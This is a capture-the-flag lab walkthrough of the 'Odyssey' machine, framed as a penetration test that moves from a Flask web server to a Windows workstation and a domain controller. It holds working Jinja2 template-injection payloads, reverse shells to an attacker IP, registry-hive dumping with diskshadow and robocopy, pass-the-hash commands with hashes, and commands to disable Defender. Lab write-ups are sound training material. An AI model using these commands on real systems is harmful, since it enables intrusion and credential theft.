# Odyssey (Hard) - Odyssey

![image.png](<../../.gitbook/assets/image (15).png>)

## Objective / Scope

You are a member of the Hack Smarter Red Team and have been assigned to perform a black-box penetration test against a client's critical infrastructure. There are three machines in scope: one `Linux web server` and `two Windows enterprise hosts.`

The client’s environment is currently in a degraded state due to ongoing migration efforts; the Domain Controllers are experiencing synchronization failures. Consequently, standard automated LDAP enumeration tools (such as BloodHound) are expected to fail or return unreliable data. The client wants to assess if an attacker can thrive in this "broken" environment where standard administrative tools are malfunctioning.

**Note From The Author**

Odyssey was built off a recent engagement that I had where the DC's were not syncing correctly. This caused a lot of problems during the engagement. We also had to go through a proxy, which made tools like LDAP very hard to use. Your normal tools may fail... can you think outside the box?

### Machines in scope:

**DC-01** `10.1.148.114`

**WKST-01** `10.1.172.55`

**Web-01** `10.1.243.22`

## Recon and Enumeration

Rustscan **DC-01** `10.1.148.114`

```bash
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-12-16 14:48:44Z)
135/tcp   open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hsm.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 126
464/tcp   open  kpasswd5?         syn-ack ttl 126
593/tcp   open  ncacn_http        syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 126
3268/tcp  open  ldap              syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hsm.local0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 126
3389/tcp  open  ms-wbt-server     syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.hsm.local
| Issuer: commonName=DC01.hsm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-17T19:53:56
| Not valid after:  2026-05-19T19:53:56
| MD5:   293c:8819:94de:55b5:378b:3326:92cd:9599
| SHA-1: 4d21:db43:ce01:bbea:7170:8254:67f4:c713:6fe4:3b05

|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http              syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  ncacn_http        syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49709/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
62646/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC

```

Rustscan **WKST-01** `10.1.172.55`

```bash
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=EC2AMAZ-NS87CNK.hsm.local
| Issuer: commonName=EC2AMAZ-NS87CNK.hsm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-29T13:15:34
| Not valid after:  2026-05-31T13:15:34
| MD5:   ffe8:c6bb:7647:4a48:7bb7:d545:c902:9128
| SHA-1: 1fc5:5bde:8287:939b:a773:8201:8530:ea02:3a36:115f

49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

```

Rustscan **Web-01** `10.1.243.22`

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 64:be:70:8e:a3:b3:26:8c:3d:1c:08:16:04:9b:73:cd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5YnAo4fB0jeHqnYRbx/rYJGw1C81ECOUKsY0TklMQSTZzszfEEtj+dxjO59Xf8AVluUPj7cSZxnzsOmYZP1fg=
|   256 f7:56:18:1a:0a:df:a3:9f:60:60:7c:06:59:63:df:09 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUyTbOSNegxJmhX8hyy+OA8pOQxq1udd7Ruc3AX6WRd

5000/tcp open  http    syn-ack ttl 62 Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: Odyssey Portal
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS GET

```

Now that the scan results are there, the mindset we have is to first compromise the Linux Web Server **Web-01** `10.1.243.22` , then followed by the Windows Machine **WKST-01** `10.1.172.55` then lastly the **DC-01** `10.1.148.114`

## Enumerating **Web-01** `10.1.243.22`

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 62 OpenSSH 9.6p1 Ubuntu 3ubuntu13.14 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 64:be:70:8e:a3:b3:26:8c:3d:1c:08:16:04:9b:73:cd (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBC5YnAo4fB0jeHqnYRbx/rYJGw1C81ECOUKsY0TklMQSTZzszfEEtj+dxjO59Xf8AVluUPj7cSZxnzsOmYZP1fg=
|   256 f7:56:18:1a:0a:df:a3:9f:60:60:7c:06:59:63:df:09 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJUyTbOSNegxJmhX8hyy+OA8pOQxq1udd7Ruc3AX6WRd

5000/tcp open  http    syn-ack ttl 62 Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: Odyssey Portal
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS GET

```

* We only have 2 ports open , `port 22 and port 5000`
* Our best approach would be on a webpage on port `5000`.

When we are presented with a webpage , there are also a few things we can do and check as a best practice.

To-Do List

* Directory Brute forcing
* Vhost fuzzing
* Check source code
* Check /robots.txt
* Check Website Functionality

NB - I am not going to look into all of these but its worth checking

![image.png](<../../.gitbook/assets/image 1 (14).png>)

* `Internal Template Preview Service` is the single most important phrase on the page
* To an attacker, this strongly implies `Server-side template rendering`
* A templating engine (Jinja2, Twig, Velocity, Handlebars, etc.)
* We also checked on the other web functionality but nothing of interest yet.
* Lets go ahead and test for `SSTI`

![image.png](<../../.gitbook/assets/image 2 (14).png>)

![image.png](<../../.gitbook/assets/image 3 (14).png>)

![image.png](<../../.gitbook/assets/image 4 (14).png>)

### Testing for SSTI

![image.png](<../../.gitbook/assets/image 5 (14).png>)

* Used `{{7*'7'}}` and if it returns the value 49, we can conclude that it is vulnerable
* We can use this resource [https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#jinja2-python) .

![image.png](<../../.gitbook/assets/image 6 (12).png>)

### Server-Side Template Injection (SSTI) Remote Code Execution payload

![image.png](<../../.gitbook/assets/image 7 (13).png>)

```bash
{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
```

![image.png](<../../.gitbook/assets/image 8 (13).png>)

* The web application just ran a command on the server **as the user `ghill_sa`**
* `ghill_sa` strongly suggests a service account ~~HOPEFULLY.~~
* In theory, Service accounts almost always have more privileges than web users.
* What do we do next??????????????????????????????????????????????
*   Well now we can try and craft a reverse shell and connect to our VM as the **`ghill_sa` user**

    ```bash
    {{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('bash -c 'exec bash -i &>/dev/tcp/10.200.23.220/4443 <&1'').read() }}

    {{ self.__init__.__globals__.__builtins__.__import__('os').popen('printf KGJhc2ggPiYgL2Rldi90Y3AvMTAuMjAwLjIzLjIyMC80NDQzIDA+JjEpICY=|base64 -d|bash').read() }}

    ```

    ![image.png](<../../.gitbook/assets/image 9 (13).png>)

    ![image.png](<../../.gitbook/assets/image 10 (13).png>)

    * Successfully obtained a shell as **`ghill_sa`**

    ![image.png](<../../.gitbook/assets/image 11 (13).png>)

    * As best practice, you want to ping sweep to find hidden live hosts on the internal network
    *   We can confirm that there are no live hosts

        ```bash
        for i in {1..254} ;do (ping -c 1 10.1.243.$i | grep "bytes from" &) ;done
        ```

### **Priv Escalation**

![image.png](<../../.gitbook/assets/image 12 (12).png>)

* We have ssh keys and the most interesting one is the `id_ed25519` which is the private key
* We can dump the `id_ed25519` locally and try to ssh as `ghill_sa` or `root` and hopefully we can elevate our privileges

```bash
scp ghill_sa@10.1.243.22:/home/ghill_sa/.ssh/id_ed25519 .

```

![image.png](<../../.gitbook/assets/image 13 (12).png>)

### Root Access

![image.png](<../../.gitbook/assets/image 14 (13).png>)

* We failed to elevate priv as `ghill_sa` but we were successful as `root`
*   Now that we are root, we can try and find the password for `ghill_sa`

    ![image.png](<../../.gitbook/assets/image 15 (11).png>)

    *   We found `ghill_sa` hash and we can further attempt to crack it

        On the target

        ```bash
        cp /root/pass.txt /root/shadow.txt /tmp/
        chmod 644 /tmp/pass.txt /tmp/shadow.txt

        ```

        ```
         On your local machine
        ```

```bash
scp ghill_sa@10.1.243.22:/tmp/pass.txt .
scp ghill_sa@10.1.243.22:/tmp/shadow.txt .

unshadow shadow.txt password.txt > john_text
```

![image.png](<../../.gitbook/assets/image 16 (11).png>)

![image.png](<../../.gitbook/assets/image 17 (12).png>)

* It took a while to crack this but we finally got the password
* Now that we have a valid username `ghill_sa` and a valid password `REDACTED` ,we can try and authenticate to our windows machine `WKST-01.`
* We can try some `smb` enumerations and the likes.

## Enumerating **WKST-01** `10.1.172.55`

**Rustscan**

```bash
PORT      STATE SERVICE       REASON          VERSION
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=EC2AMAZ-NS87CNK.hsm.local
| Issuer: commonName=EC2AMAZ-NS87CNK.hsm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-29T13:15:34
| Not valid after:  2026-05-31T13:15:34
| MD5:   ffe8:c6bb:7647:4a48:7bb7:d545:c902:9128
| SHA-1: 1fc5:5bde:8287:939b:a773:8201:8530:ea02:3a36:115f

49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC

```

### Generating host files

```bash
nxc smb 10.1.172.55 -u ghill_sa  -p 'REDACTED' --generate-hosts-file hosts

```

![image.png](<../../.gitbook/assets/image 18 (10).png>)

* Add these to `/etc/hosts`

### Initial access with our discovered Creds `ghill_sa:REDACTED`

* Test access with `smb, rdp, winrm, ldap` etc.

```bash
nxc smb EC2AMAZ-NS87CNK.hsm.local -u ghill_sa  -p 'REDACTED' --shares
nxc ldap EC2AMAZ-NS87CNK.hsm.local -u ghill_sa  -p 'REDACTED' 
nxc rdp EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p 'REDACTED'
nxc winrm EC2AMAZ-NS87CNK.hsm.local -u ghill_sa  -p 'REDACTED'
```

![image.png](<../../.gitbook/assets/image 19 (12).png>)

* We are getting errors when trying to connect with our creds.
* We can to authentically locally with adding `— local-auth`

```bash
nxc rdp EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p 'P@ssw0rd!' --local-auth
```

![image.png](<../../.gitbook/assets/image 20 (11).png>)

* We get a `Pwned` and now we can `rdp` to the windows machine

### Windows Access

```bash
xfreerdp3 /v:10.1.172.55 /u:ghill_sa /p:'P@ssw0rd!' +clipboard /dynamic-resolution /drive:$(pwd),share
```

![image.png](<../../.gitbook/assets/image 21 (12).png>)

* Now that we have windows access, what then should we look for?

![image.png](<../../.gitbook/assets/image 22 (12).png>)

![image.png](<../../.gitbook/assets/image 23 (12).png>)

* We have found some interacting files and lets read them one by one to see what we can get.

![image.png](<../../.gitbook/assets/image 24 (12).png>)

![image.png](<../../.gitbook/assets/image 25 (12).png>)

* A lot of these files contained creds that were not helpful to us.

## Helpful quick checklist

**Confirm who you are & your privileges**

```bash
whoami
whoami /groups
whoami /priv
net localgroup administrators

```

![image.png](<../../.gitbook/assets/image 48 (4).png>)

**Check if you can already access admin-only locations**

```bash
dir C:\Users\Administrator
dir C:\Windows\System32\config

```

**Look for stored credentials**

```bash
cmdkey /list

```

* If you see saved creds: `runas /savecred /user:Administrator cmd`
* Search for passwords in files `findstr /si /m "password pass pwd admin" C:\*.txt C:\*.ini C:\*.xml`
* Also manually check: `dir C:\Users\*\Documents` `dir C:\Users\*\Desktop`

**Check running services**

```bash
sc query state= all
sc qc <service_name>

```

* To check directory permissions: `icacls "C:\Path\To\Service\"` If _you can write to the service binary or its folder_ → replace it → restart service.

**Unquoted Service Path vulnerability**

```bash
C:\Program Files\Vulnerable Service\service.exe

C:\Program.exe
C:\Program Files\Vulnerable.exe

icacls C:\
icacls "C:\Program Files"

```

**Scheduled tasks**

```bash
schtasks /query /fo LIST /v

```

* Tasks running as `SYSTEM`
* Executables in writable locations

**Check AlwaysInstallElevated**

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
reg query HKLM\Software\Policies\Microsoft\Windows\Installer

```

* If both are `1` → you can run a malicious MSI as SYSTEM.

**Dump local credentials**

```bash
reg save HKLM\SAM sam.save
reg save HKLM\SYSTEM system.save

```

* We can also use mimikatz for this as well.

**Lets run the cmd as administrator**

![image.png](<../../.gitbook/assets/image 27 (11).png>)

![image.png](<../../.gitbook/assets/image 28 (10).png>)

![image.png](<../../.gitbook/assets/image 48 (4).png>)

* `bbarkinson` is a member of administrators.
* **Group**: `BUILTIN\Backup Operators`
* **Privilege**: `SeBackupPrivilege`
* With these we can read ANY protected system file , Dump **SAM + SYSTEM registry hives.**

Since we are a member of the `Backup Operators group`, we are authorized to create system backups. We will use this to our advantage by creating a backup that includes the `NTDS.dit` file, from which we can extract the hashes for later use to escalate our privileges

With `**SeBackupPrivilege`\*\* we can assign a user the SeBackupPrivilege. This privilege grants comprehensive read access to the entire file system by circumventing all established Access Control Lists (ACLs). Effectively, it allows a user to view any file on the network, regardless of administrative restrictions or the sensitivity of the data.

### `**SeBackupPrivilege**`

First, we need to create a user to whom we will be providing the privilege

```bash
net user RedBlue_Frank RedBlue /add
```

Enabling WinRM

```bash
powershell -ep bypass
Enable-PSRemoting -Force
```

```bash
Install-Module -Name carbon
Import-Module carbon

Grant-CPrivilege -Identity aarti -Privilege SeBackupPrivilege
Test-CPrivilege -Identity aarti -Privilege SeBackupPrivilege
```

Granting Privileges to the New User

Testing

```bash
evil-winrm -i 10.1.172.55 -u RedBlue_Frank -p RedBlue
whoami /priv
```

### `Backup Operators group`

* Backup Operator allows an attacker to use backup utilities such as `diskshadow` and `robocopy` to grab registry hives and dump credentials from them.
* It is always important to run the `cmd` as an `administrator`.
* If you’re in the `**Backup Operators** group`, dumping \*\*`SAM**, **SYSTEM**, and **SECURITY**` lets you **extract `local account password hashes`** (and sometimes cached creds) **without being an administrator**, which can then be cracked or reused to escalate privileges.

![image.png](<../../.gitbook/assets/image 30 (9).png>)

* Making sure to run as an admin

![image.png](<../../.gitbook/assets/image 31 (7).png>)

* We were successful in saving the `SAM and SYSTEM` but not the `SECURITY.`
* `Reg save hklm\Security` seem to be blocked. **WHAT DO WE DO NOW??**
* We can also try to utilities tools such as `diskshadow` and `robocopy` to grab registry hives.

```bash
nxc smb EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p 'P@ssw0rd!' -L

```

* **We can also List available SMB modules** that can be run once authentication is confirmed.
* We can confirm that we can perform a `backup_operator` module
* We however need `rpc` to perform this.

![image.png](<../../.gitbook/assets/image 32 (6).png>)

```bash
nxc smb EC2AMAZ-NS87CNK.hsm.local -u ghill_sa -p P@ssw0rd! -M backup_operator

```

![image.png](<../../.gitbook/assets/image 33 (7).png>)

* This did not work but it was worth trying because we are getting closer to what actually works. `The beauty about rabbit holes.`

**Now we can also try to utilities tools such as `diskshadow` and `robocopy` to grab registry hives.**

```bash
#Backup Operator Script
set verbose onX
set metadata C:\Windows\Temp\meta.cabX
set context clientaccessibleX
set context persistentX
begin backupX
add volume C: alias cdriveX
createX
expose %cdrive% Z:X
end backupX
```

* We need to create and save this file on our machine then transfer it to our victims machine.

![image.png](<../../.gitbook/assets/image 34 (6).png>)

![image.png](<../../.gitbook/assets/image 35 (5).png>)

Now we need to create the `diskshadow`

```bash
diskshadow /s shadow.txt
```

![image.png](<../../.gitbook/assets/image 36 (5).png>)

![image.png](<../../.gitbook/assets/image 37 (5).png>)

* `diskshadow` bypassed file locks
* Exposed `C:` snapshot as **`Z:\`**
* We can now read locked registry hives `(SAM, SYSTEM, SECURITY)` **HOPEFULLY.**
*   Lets try and copy SAM & SYSTEM from the shadow copy

    ```bash
    copy Z:\Windows\System32\config\SAM C:\Share\SAM
    copy Z:\Windows\System32\config\SYSTEM C:\Share\SYSTEM
    copy Z:\Windows\System32\config\SECURITY C:\Share\SECURITY

    dir C:\Share

    ```

    ![image.png](<../../.gitbook/assets/image 38 (5).png>)

    * `Access is denied` when copying SAM
    * Even through a shadow copy, **`copy` still enforces ACL checks**.

We can try `robocopy`

```bash
robocopy /b Z:\Windows\System32\config C:\Share SAM
robocopy /b Z:\Windows\System32\config C:\Share SYSTEM
robocopy /b Z:\Windows\System32\config C:\Share SECURITY

dir C:\Share

```

![image.png](<../../.gitbook/assets/image 39 (5).png>)

* BOOOM we were successful
* Now i can transfer these files to my local machine.

```bash
#On my local machine
smbserver.py share . -smb2support

#On target machine

copy C:\Share\SAM \\10.200.23.220\share\
copy C:\Share\SYSTEM \\10.200.23.220\share\
copy C:\Share\SECURITY \\10.200.23.220\share\

```

![image.png](<../../.gitbook/assets/image 40 (5).png>)

* Could not copy files

```bash
#On my local machine

#On target machine
certutil -urlcache -f http://10.200.23.220:8000/ C:\Share\SAM
certutil -urlcache -f http://10.200.23.220:8000/ C:\Share\SYSTEM
certutil -urlcache -f http://10.200.23.220:8000/ C:\Share\SECURITY

```

![image.png](<../../.gitbook/assets/image 41 (4).png>)

* I was blocked by `Microsoft Defender Antivirus`

**Trying smbclient**

```bash
 smbclient //10.1.172.55/C$ -U ghill_sa
```

![image.png](<../../.gitbook/assets/image 42 (3).png>)

![image.png](<../../.gitbook/assets/image 43 (3).png>)

* Finally managed to pull the hives through `smbclient`
*   We can use [`secretdump.py`](http://secretdump.py/) from Impacket to extract secrets

    ```bash
    secretsdump.py -sam SAM -system SYSTEM -security SECURITY local 
    ```

![image.png](<../../.gitbook/assets/image 44 (4).png>)

* BOOOOOOM we have the hashes

## Interactive shell

*   Using the `Administrator` NTLM hash to abtain a shell

    ```bash
    smbclient.py -hashes :d5cad8a9782b2879bf316f56936f1e36 administrator@10.1.172.55

    ```

Or

```bash
impacket-wmiexec Administrator@10.1.172.55 -hashes :d5cad8a9782b2879bf316f56936f1e36
```

![image.png](<../../.gitbook/assets/image 45 (4).png>)

![image.png](<../../.gitbook/assets/image 46 (4).png>)

* BOOOOOOOOOOOM we got another flag

## Enumerating DC\*\*-01\*\* `10.1.148.114`

```bash
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 126 Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2025-12-16 14:48:44Z)
135/tcp   open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hsm.local0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 126
464/tcp   open  kpasswd5?         syn-ack ttl 126
593/tcp   open  ncacn_http        syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 126
3268/tcp  open  ldap              syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: hsm.local0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 126
3389/tcp  open  ms-wbt-server     syn-ack ttl 126
| ssl-cert: Subject: commonName=DC01.hsm.local
| Issuer: commonName=DC01.hsm.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-11-17T19:53:56
| Not valid after:  2026-05-19T19:53:56
| MD5:   293c:8819:94de:55b5:378b:3326:92cd:9599
| SHA-1: 4d21:db43:ce01:bbea:7170:8254:67f4:c713:6fe4:3b05

|_ssl-date: TLS randomness does not represent time
5985/tcp  open  http              syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf            syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49666/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49667/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49671/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49676/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49677/tcp open  ncacn_http        syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49696/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
49709/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC
62646/tcp open  msrpc             syn-ack ttl 126 Microsoft Windows RPC

```

* We now need to enumerate for valid users and creds
* Either we can use the information we got from the hives below to enumerate for valid creds

![image.png](<../../.gitbook/assets/image 44 (4).png>)

**Or**

* Let me take you back to one of the users which happened to be in the admin group `bbarkinson`
* We can use this knowledge and verify if the creds are valid or not.

![image.png](<../../.gitbook/assets/image 48 (4).png>)

```bash
bbarkinson:53c3709ae3d9f4428a230db81361ffbc
```

### Verifying User

```bash
nxc smb 10.1.148.114 -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc

nxc smb 10.1.148.114 -d DC01.hsm.local -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc --rid-brute

```

![image.png](<../../.gitbook/assets/image 49 (4).png>)

* We have a set of valid creds
* Now lets obtain loot using Bloodhound

### Bloodhound

```bash
bloodhound-ce-python \
  -u bbarkinson \
  --hashes :53c3709ae3d9f4428a230db81361ffbc \
  -d hsm.local \
  -dc DC01.hsm.local \
  -ns 10.1.148.114 \
  -c All \
  --zip

```

![image.png](<../../.gitbook/assets/image 50 (3).png>)

* The error is basically telling you the `DC is hardened (LDAP signing / LDAPS),` and this Python collector can’t complete a secure LDAP bind in this configuration, which is why the connection gets reset.
* `LDAP` Authentication is refused because `LDAP signing is enabled`. Trying to connect over LDAPS instead, The DC requires LDAP signing on port 389, so unsigned simple binds are rejected and the tool switches to LDAPS (TCP 636).

**Trying with ldap**

```bash
nxc ldap DC01.hsm.local  -u bbarkinson -H 53c3709ae3d9f4428a230db81361ffbc --bloodhound --collection All --dns-server  10.1.148.114

nxc ldap 10.1.148.114 \
  -u bbarkinson \
  -H 53c3709ae3d9f4428a230db81361ffbc \
  -d hsm.local \
  --dns-server 10.1.148.114 \
  --bloodhound --collection All
```

![image.png](<../../.gitbook/assets/image 51 (3).png>)

* `Connection reset by peer means` DC sent a RST packet to immediately kill your connection

### Practical ways to resolve / work around

*   Try Windows `Sharphound` instead of the Python ingestor from a Windows host in the domain as `bbarkinson` .

    ```bash
    SharpHound.exe --CollectionMethod All --ZipFileName hsm_all.zip
    ```

Since port `5985` is open i will try to use winrm on `DC01`

```bash
evil-winrm -i 10.1.148.114 -u 'hsm.local\bbarkinson' -H 53c3709ae3d9f4428a230db81361ffbc

```

![image.png](<../../.gitbook/assets/image 52 (3).png>)

* Well i couldn’t get access.
* Now what’s next…….??????????????????????????

### Mind-Mapping

* We have compromised `Wks-01` , we now need to try and see if we can reach the domain controller from this workstation.
*   if we can recall, `wkst-01` had windows defender active. That means if we upload `Sharphound.ps1`, there are higher chances that it might get blocked or detected. Hence we need to find a way to disable it.

    ![image.png](<../../.gitbook/assets/image 41 (4).png>)
* We also tried to obtain bloodhound loot with various ways and our chance now is running `Sharphound` in `WKS_01.`

### Connecting to rdp with user `bbarkinson`

```bash
xfreerdp3 /v:10.1.172.55 /u:bbarkinson /pth:53c3709ae3d9f4428a230db81361ffbc /cert:ignore +clipboard /dynamic-resolution /drive:$PWD,share
```

![image.png](<../../.gitbook/assets/image 54 (2).png>)

* No luck this time **##LOOKS LIKE WE’RE AT A DEAD END AND KEEP HITTING RABBIT HOLES.##**
* In `Pass-the-Hash` scenarios over RDP, it often signals Restricted Admin Mode rejection or "Allow delegating non-exportable credentials" policy enforcement, forcing plaintext passwords instead.

Another idea just popped up since plaintext passwords are enforced, we can try and add `ghill_sa` to `local admins` . This is a `**local privilege escalation by group membership abuse`.\*\*

### Adding `ghill_sa` to local Administrators

```bash
 nxc smb 10.1.172.55 \
  -u Administrator  \
  -H d5cad8a9782b2879bf316f56936f1e36 \
  -X "Add-LocalGroupMember -Group Administrators -Member ghill_sa" \
  --no-output

nxc smb 10.1.172.55 -u Administrator -H d5cad8a9782b2879bf316f56936f1e36 --exec-method=smbexec --local-auth -X 'net localgroup Administrators ghill_sa /add'

```

![image.png](<../../.gitbook/assets/image 55 (2).png>)

* I had to try 2 times

![image.png](<../../.gitbook/assets/image 56 (2).png>)

* Now that `ghill_sa` is a member of local administration, we now have Administration privileges and we can send SharpHound.ps1 https://1337skills.com/cheatsheets/sharphound/#powershell-usage

```bash
iwr -uri http://10.200.23.220:8000/SharpHound.ps1 -Outfile SharpHound.ps1

# Import PowerShell module
Import-Module .\SharpHound.ps1

# Verify
Get-Command Invoke-BloodHound

# Collection with domain specification
Invoke-BloodHound  -Domain hsm.local -DomainController DC01.hsm.local -zipfilename hsm_loot

Invoke-BloodHound `
  -Domain hsm.local `
  -DomainController DC01.hsm.local `
  -LDAPPort 389 `
  -SecureLDAP:$false `
  -CollectionMethod All `
  -ZipFileName hsm_loot.zip

```

![image.png](<../../.gitbook/assets/image 57 (2).png>)

* Windows defender spotted our file and deleted it
* We can disable it

```bash
Set-MpPreference -DisableRealtimeMonitoring $true
```

![image.png](<../../.gitbook/assets/image 58 (2).png>)

![image.png](<../../.gitbook/assets/image 59 (2).png>)

* Network/DNS issues: The attacking host cannot resolve `DC01.hsm.local` or cannot route to it.
* It could also mean a wrong DC hostname / DNS issue. In our case the hostname is correct but there are some DNS issues. If we can also recall, the scope gave us a hint: `The client’s environment is currently in a degraded state due to ongoing migration efforts; the Domain Controllers are experiencing synchronization failures. Consequently, standard automated LDAP enumeration tools (such as BloodHound) are expected to fail or return unreliable data. The client wants to assess if an attacker can thrive in this "broken" environment where standard administrative tools are malfunctioning.`

### Confirming domain reach

* We can just ping `commonName=DC01.hsm.local`

![image.png](<../../.gitbook/assets/image 60 (2).png>)

When a workstation cannot ping the `domain controller (DC)`, it typically indicates a connectivity, DNS resolution, or firewall issue breaking basic network communication essential for Active Directory authentication and domain services.

**Common Causes**

* **DNS Failure**: Most frequent culprit. Workstation DNS servers (check via `ipconfig /all`) aren't the DC's IP, or DNS service on DC is down. Can't resolve DC hostname like `hml.local` without proper DNS
* **Network Profile/Firewall**: DC or workstation network shows as "Public" instead of "Domain Authenticated". Run `Get-NetConnectionProfile` on both; Public blocks ICMP/DNS.

**Manual connectivity fix**

*   Run `ncpa.cpl`

    ![image.png](<../../.gitbook/assets/image 61 (2).png>)

    ![image.png](<../../.gitbook/assets/image 62 (2).png>)

    ![image.png](<../../.gitbook/assets/image 63 (2).png>)

    * **On** `Preferred DNS server` We can provide the IP address of the Domain Controller (DC01). `10.1.148.114`

    #### `I reset the lab machine; therefore, the IP addresses have changed`

    ![image.png](<../../.gitbook/assets/image 64 (2).png>)

![image.png](<../../.gitbook/assets/image 65 (2).png>)

![image.png](<../../.gitbook/assets/image 66 (2).png>)

* After configuring the DNS we can now reach the Domain Controller.
* Now we can run SharpHound.ps1

![image.png](<../../.gitbook/assets/image 67 (2).png>)

* Incorrect password for the current Administrator user on `DC01.hsm.local.`
* **SharpHound LDAP queries REQUIRE valid domain credentials which we do not have at the moment.** Local admin rights on a member machine are not enough.

**Fixes to Try**

